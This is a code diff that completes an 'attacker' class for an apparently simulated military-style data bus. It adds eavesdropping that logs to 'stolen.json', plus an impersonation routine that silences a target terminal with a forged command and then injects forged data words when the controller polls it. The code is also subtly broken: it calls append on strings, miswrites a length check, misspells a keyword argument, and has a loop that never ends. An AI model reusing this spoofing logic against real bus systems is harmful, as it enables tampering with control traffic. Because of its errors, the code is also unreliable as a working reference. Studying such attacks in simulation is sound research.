@@ -8,6 +8,8 @@ from datetime import datetime
 from os import getcwd
 from json import dump
 from random import randint
+from time import sleep
+from bitstring import BitArray
 from bus import bus
 
 class attacker(object):
@@ -62,7 +64,7 @@ class attacker(object):
         Timer(frequency, self.eavesdrop, [frequency]).start() # Call repeatedly on a timer
         event = {}
         self.addtime(event)
-        tmp_message = bus.read_BitArray()
+        tmp_message = self.bus.read_BitArray()
         event["Overheard Message"] = tmp_message
         with open(getcwd() + '/io/jsons/stolen.json', 'a') as event_dumped:
             dump(event, event_dumped)
@@ -91,10 +93,39 @@ class attacker(object):
         data = ["IM", "RT", str(num_src)]
         if len(data[2] != 2):
             data[2] = "0" + data[2]
-        #TODO: Add code to send forged messages under the guise of another device
-        #-Read in messages like a normal RT
-        #-When the BC sends a command word that lets this RT speak, send pre-coded message instead
-        pass
+        # Shut up the RT that is being imitated. Send command word to listen for the maximum possible time, rendering the RT inert for a while.
+        hush_command =  '0b101' + BitArray(uint=num_src, length=5).bin + '0' + '10101' + '11111'
+        if(hush_command.count(1) % 2 == 0):
+            hush_command.append('1')
+        else:
+            hush_command.append('0')
+        self.bus.write_BitArray(BitArray(hush_command))
+        # Now, wait for BC instruction to transmit.
+        go_ahead = 0
+        while go_ahead == 0:
+            sleep(frequency)
+            msg = self.bus.read_BitArray()
+            if(msg[:3].bin != "101"): # Not a command word
+                continue
+            if(msg[3:8] != BitArray(uint=num_src, length=5).bin): # Not word targeting this imitated RT
+                continue
+            if(msg[8] == False): # Not a word that commands to transmit
+                continue
+            if((msg[9:14] == '00000') or (msg[9:14] == '11111')): # Command word w/ mode code, ignore.
+                continue
+            else: # This RT is being given time to speak on the bus. Initiate transfer, and send data. Pad with "!!"
+                allowed_sends = int(msg[14:19].bin, 2)
+                while(allowed_sends > len(data)):
+                    data.append("!!")
+                for char_pair in data:
+                    data_word = '0b110' + BitArray(unit=ord(char_pair[0]), length=8).bin + BitArray(unit=ord(char_pair[1]), length=8).bin
+                    if(data_word.count(1) % 2 == 0):
+                        data_word.append("1")
+                    else:
+                        data_word.append("0")
+                    self.bus.write_BitArray(BitArray(data_word))
+                    sleep(frequency) # Give time for message to be read
+        return
 
     # Destructor
     def __del__(self):
